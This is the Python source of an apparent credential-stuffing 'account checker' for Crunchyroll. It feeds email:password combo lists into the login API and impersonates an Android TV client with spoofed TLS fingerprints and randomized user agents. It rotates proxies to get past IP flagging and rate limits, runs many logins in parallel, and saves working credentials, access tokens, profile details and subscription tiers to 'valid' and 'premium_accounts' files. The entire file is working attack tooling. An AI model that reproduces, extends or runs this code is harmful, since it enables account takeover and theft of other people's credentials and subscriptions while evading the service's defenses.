import json
import random
import threading
import time
import uuid
from pathlib import Path

import tls_client

from .misc import Miscellaneous

API_BASE = "https://beta-api.crunchyroll.com"
API_HOST = "beta-api.crunchyroll.com"


# ── shared helpers ────────────────────────────────────────────────────────
def _ua_version(app_version: str) -> str:
    return app_version.replace("(", "").replace(")", "").replace(" ", "_")


def parse_credentials(line: str):
    if not line:
        return None
    line = line.strip()
    if not line:
        return None
    cred_part, meta = line, None
    if " | " in line:
        cred_part, _, meta = line.partition(" | ")
        meta = meta.strip() or None
    if ":" not in cred_part:
        return None
    email, password = cred_part.split(":", 1)
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return None
    return email, password, meta


def is_ssl_error(exc: Exception) -> bool:
    msg = str(exc).lower()
    return any(m in msg for m in (
        "certificate", "ssl", "tls", "x509", "unknown ca",
        "self-signed", "self signed", "hostname mismatch",
    ))


def classify_401(response) -> str:
    try:
        body = response.json()
    except Exception:
        try:
            body = json.loads(response.text)
        except Exception:
            return "unknown"
    err = (body.get("error") or "").lower()
    if err == "invalid_grant":
        return "invalid_grant"
    if err in ("invalid_client", "unauthorized_client"):
        return "invalid_client"
    return "unknown"


class SafeWriter:
    """Thread-safe append with an internal lock + per-path dedupe of dirs."""
    def __init__(self, base: Path):
        self.base = base
        self._lock = threading.Lock()
        (self.base / "valid").mkdir(parents=True, exist_ok=True)
        (self.base / "invalid").mkdir(parents=True, exist_ok=True)
        (self.base / "retry").mkdir(parents=True, exist_ok=True)
        (self.base / "errors").mkdir(parents=True, exist_ok=True)

    def write(self, rel: str, line: str):
        with self._lock:
            path = self.base / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            with open(path, "a", encoding="utf-8") as f:
                f.write(line)


# ── proxy preflight ───────────────────────────────────────────────────────
def probe_proxy(proxy_url: str, app_version: str, timeout: int = 10):
    def _attempt(verify: bool):
        session = tls_client.Session(
            client_identifier="okhttp4_android_13",
            random_tls_extension_order=True,
        )
        session.proxies = {"http": proxy_url, "https": proxy_url}
        session.headers = {
            "user-agent": Miscellaneous.randomize_user_agent(_ua_version(app_version)),
            "host": API_HOST,
        }
        return session.get(f"{API_BASE}/auth/v1/token", timeout_seconds=timeout)

    try:
        _attempt(verify=True)
        return True, ""
    except Exception as e1:
        if is_ssl_error(e1):
            try:
                _attempt(verify=False)
                return True, "alive (verify=False)"
            except Exception as e2:
                return False, f"{type(e2).__name__}: {str(e2)[:140]}"
        return False, f"{type(e1).__name__}: {str(e1)[:140]}"


def preflight_proxies(proxies, app_version: str, ui, workers=50, timeout=10):
    """Returns (alive_list, elapsed_seconds). Emits info/warn events on ui."""
    if not proxies:
        return [], 0.0
    from concurrent.futures import ThreadPoolExecutor, as_completed

    alive, dead, reasons = [], [], []
    start = time.time()
    with ThreadPoolExecutor(max_workers=workers) as ex:
        fmap = {ex.submit(probe_proxy, p, app_version, timeout): p for p in proxies}
        done = 0
        for fut in as_completed(fmap):
            proxy = fmap[fut]
            try:
                ok, reason = fut.result()
            except Exception as e:
                ok, reason = False, f"future: {type(e).__name__}: {e}"
            if ok:
                alive.append(proxy)
            else:
                dead.append(proxy)
                if reason:
                    reasons.append((proxy, reason))
            done += 1
            if done % 25 == 0:
                ui.info(f"preflight {done}/{len(proxies)} — {len(alive)} alive")
    elapsed = round(time.time() - start, 2)
    for proxy, reason in reasons[:5]:
        short = proxy if len(proxy) <= 80 else proxy[:40] + "..." + proxy[-30:]
        ui.warn(f"dead proxy — {short} | {reason}")
    if len(reasons) > 5:
        ui.warn(f"...and {len(reasons) - 5} more dead")
    return alive, elapsed


# ── account checker ───────────────────────────────────────────────────────
class AccountChecker:
    def __init__(self, proxy_dict, proxy_pool, proxy_lock, basic_auth, app_version):
        self.proxyless = proxy_dict is None and not proxy_pool
        self.max_retries = 1 if self.proxyless else 3
        self.retry_delay = 2
        self.session = tls_client.Session(
            "okhttp4_android_13", random_tls_extension_order=True
        )
        self.session.headers = Miscellaneous.build_headers(
            basic_auth, _ua_version(app_version)
        )
        self.session.proxies = proxy_dict
        self.proxy_pool = proxy_pool
        self.proxy_lock = proxy_lock
        self.last_error = ""

    def _rotate_proxy(self):
        if not self.proxy_pool:
            return
        with self.proxy_lock:
            choice = random.choice(self.proxy_pool)
        self.session.proxies = {"http": choice, "https": choice}

    def login(self, email, password):
        retries = 0
        while retries < self.max_retries:
            try:
                payload = {
                    "grant_type": "password",
                    "username": email,
                    "password": password,
                    "scope": "offline_access",
                    "device_id": str(uuid.uuid4()),
                    "device_name": "ANDROIDTV",
                    "device_type": "ANDROIDTV",
                }
                r = self.session.post(
                    f"{API_BASE}/auth/v1/token", data=payload, timeout_seconds=20
                )

                if r.status_code == 200:
                    try:
                        jwt = r.json().get("access_token")
                    except ValueError:
                        jwt = None
                    if jwt:
                        self.session.headers["authorization"] = f"Bearer {jwt}"
                        return jwt
                    self.last_error = "200 without access_token"
                    retries += 1
                    if retries >= self.max_retries:
                        return "ERROR"
                    time.sleep(self.retry_delay)
                    continue

                if r.status_code == 400:
                    try:
                        err = (r.json().get("error") or "").lower()
                    except Exception:
                        err = ""
                    self.last_error = f"400 {err or 'bad_request'}"
                    if err in ("unsupported_grant_type", "invalid_request",
                               "unsupported_content_type"):
                        return "FATAL"
                    return "INVALID"

                if r.status_code == 401:
                    kind = classify_401(r)
                    if kind == "invalid_client":
                        self.last_error = "invalid_client"
                        return "FATAL"
                    if kind == "invalid_grant":
                        return "INVALID"
                    self.last_error = "401 unknown"
                    return "INVALID"

                if r.status_code == 403:
                    retries += 1
                    self.last_error = "403 flagged IP"
                    if retries >= self.max_retries:
                        return "RETRY"
                    time.sleep(self.retry_delay)
                    self._rotate_proxy()
                    continue

                if r.status_code == 429:
                    retries += 1
                    self.last_error = "429 rate limited"
                    if retries >= self.max_retries:
                        return "RETRY"
                    time.sleep(self.retry_delay)
                    self._rotate_proxy()
                    continue

                if r.status_code >= 500:
                    retries += 1
                    self.last_error = f"server {r.status_code}"
                    if retries >= self.max_retries:
                        return "ERROR"
                    time.sleep(self.retry_delay)
                    continue

                self.last_error = f"unexpected {r.status_code}"
                return "ERROR"

            except Exception as e:
                retries += 1
                self.last_error = str(e)[:100]
                if retries >= self.max_retries:
                    return "ERROR"
                time.sleep(self.retry_delay)
                self._rotate_proxy()
        return "ERROR"

    def get_external_id(self):
        try:
            r = self.session.get(f"{API_BASE}/accounts/v1/me", timeout_seconds=20)
            if r.status_code == 200:
                try:
                    return r.json().get("external_id")
                except ValueError:
                    self.last_error = "malformed /me"
                    return None
            self.last_error = f"/me {r.status_code}"
            return None
        except Exception as e:
            self.last_error = str(e)[:100]
            return None

    def get_capture(self):
        try:
            r = self.session.get(
                f"{API_BASE}/accounts/v1/me/multiprofile", timeout_seconds=20
            )
            if r.status_code != 200:
                return (1, "unknown", "unknown", "unknown")
            data = r.json()
            profiles = data.get("profiles", [])
            if not profiles:
                return (1, "unknown", "unknown", "unknown")
            p = profiles[0]
            ratings = p.get("extended_maturity_rating", {})
            country = next(iter(ratings.keys()), "")
            return (len(profiles), p.get("profile_id", "unknown"),
                    p.get("username", ""), country)
        except Exception:
            return (1, "unknown", "unknown", "unknown")

    def check_subscription(self, extra_id):
        try:
            r = self.session.get(
                f"{API_BASE}/subs/v1/subscriptions/{extra_id}/benefits",
                timeout_seconds=20,
            )
            if r.status_code == 404:
                return "Free"
            if r.status_code != 200:
                return "Unknown"
            try:
                data = r.json()
            except ValueError:
                return "Unknown"
            if not data:
                return "Free"
            items = data.get("items", [])
            total = data.get("total", 0)
            if total == 0 or not items:
                return "Free"
            benefits = {item.get("benefit", "") for item in items}
            if "cr_fan_pack" in benefits:
                return "Fan Pack"
            if "cr_premium" in benefits:
                return "Premium"
            if "cr_mega_pack" in benefits:
                return "Mega Pack"
            return "Unknown"
        except Exception:
            return "Unknown"


# ── job orchestrator ──────────────────────────────────────────────────────
class Job:
    """
    A single check run. Isolated workdir, proxy pool, thread pool, cancel token.
    """
    def __init__(self, job_id, job_dir: Path, accounts: list, proxies: list,
                 cfg: dict, ui):
        self.job_id = job_id
        self.dir = Path(job_dir)
        self.accounts = accounts
        self.proxies = proxies
        self.cfg = cfg
        self.ui = ui
        self.cancel = threading.Event()
        self.threads = []
        self.writer = SafeWriter(self.dir / "output")
        self._proxy_lock = threading.Lock()

        self.basic_auth = cfg["auth"]["BasicAuth"]
        self.app_version = cfg["auth"]["AppVersion"]
        self.thread_count = cfg["dev"].get("Threads", 4)
        self.proxyless = cfg["dev"].get("Proxyless", False)

    def _get_proxy_dict(self):
        if not self.proxies:
            return None
        with self._proxy_lock:
            choice = random.choice(self.proxies)
        return {"http": choice, "https": choice}

    def _check_one(self, credentials: str):
        if self.cancel.is_set():
            return
        parsed = parse_credentials(credentials)
        if not parsed:
            self.writer.write("invalid/invalid.txt", f"{credentials}\n")
            return

        email, password, prior_meta = parsed
        self.ui.checking(email)

        checker = AccountChecker(
            self._get_proxy_dict(),
            self.proxies,
            self._proxy_lock,
            self.basic_auth,
            self.app_version,
        )
        token = checker.login(email, password)

        if token == "FATAL":
            self.ui.fatal("Auth-level failure — aborting job.")
            self.cancel.set()
            return

        if token == "INVALID":
            self.ui.invalid(email)
            self.writer.write("invalid/invalid.txt", f"{email}:{password}\n")
            return

        if token == "RETRY":
            self.ui.retry(email, checker.last_error)
            self.writer.write(
                "retry/retry.txt", f"{email}:{password} | {checker.last_error}\n"
            )
            return

        if token == "ERROR" or not token:
            reason = checker.last_error or "unknown error"
            self.ui.error(email, reason)
            self.writer.write(
                "errors/errors.txt", f"{email}:{password} | {reason}\n"
            )
            return

        external_id = checker.get_external_id()
        if not external_id:
            self.ui.valid(email, "Valid (partial)")
            partial = (
                f"{email}:{password} | {prior_meta}\n" if prior_meta
                else f"{email}:{password}\n"
            )
            self.writer.write("valid/valid.txt", partial)
            self.writer.write(
                "errors/errors.txt",
                f"{email}:{password} | partial /me fail: {checker.last_error}\n",
            )
            return

        subscription = checker.check_subscription(external_id)
        profile_number, account_id, username, country = checker.get_capture()

        self.ui.valid(email, subscription or "Valid")

        valid_line = (
            f"{email}:{password} | {prior_meta}\n" if prior_meta
            else f"{email}:{password}\n"
        )
        self.writer.write("valid/valid.txt", valid_line)
        self.writer.write(
            "valid/full_valid_capture.txt",
            f"{username}:{email}:{password}:{token}:{account_id}:"
            f"{subscription}:{profile_number}:{external_id}:{country}\n",
        )
        if subscription == "Free":
            self.writer.write("valid/free.txt", valid_line)
        else:
            self.writer.write(
                "valid/premium_accounts.txt",
                f"{email}:{password}|{subscription}\n",
            )

    def run(self):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        try:
            with ThreadPoolExecutor(max_workers=self.thread_count) as ex:
                futures = [ex.submit(self._check_one, a) for a in self.accounts]
                for fut in as_completed(futures):
                    if self.cancel.is_set():
                        for f in futures:
                            f.cancel()
                        break
                    try:
                        fut.result()
                    except Exception as e:
                        self.ui.warn(f"thread error: {e}")
        finally:
            self.ui.done()